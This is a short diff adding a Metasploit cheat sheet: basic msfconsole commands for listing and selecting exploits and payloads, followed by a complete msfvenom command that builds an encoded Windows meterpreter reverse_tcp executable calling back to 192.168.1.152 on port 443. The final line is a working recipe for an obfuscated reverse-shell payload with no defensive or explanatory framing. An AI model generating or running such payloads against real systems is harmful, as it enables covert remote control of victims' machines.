@@ -1,0 +1,10 @@
+﻿msfconsole
+show exploits
+show payloads
+show auxiliary
+search name
+info
+use name
+LHOST
+windows
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.152 LPORT=443 -f exe > c.exe
